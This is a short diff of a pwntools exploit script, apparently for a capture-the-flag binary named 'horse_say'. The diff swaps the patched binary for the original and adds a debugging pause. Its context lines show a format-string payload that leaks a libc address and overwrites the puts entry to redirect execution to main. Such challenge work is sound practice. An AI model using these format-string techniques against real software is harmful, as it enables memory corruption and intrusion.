@@ -5,7 +5,7 @@ from pwn import *
 # ENV
 PORT = 0000
 HOST = "000000000"
-exe = context.binary = ELF("./horse_say_patched", checksec=False)
+exe = context.binary = ELF("./horse_say", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
 ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
 
@@ -23,7 +23,7 @@ else:
     p = exe.process()
 
 # Leak libc_base and overwrite puts -> main
-
+input()
 fmt = b"%143$p|"
 fmt += f"%{exe.sym.main - 15 & 0xffff}c%16$hn".encode()
 payload = fmt.ljust(0x20, b'A')
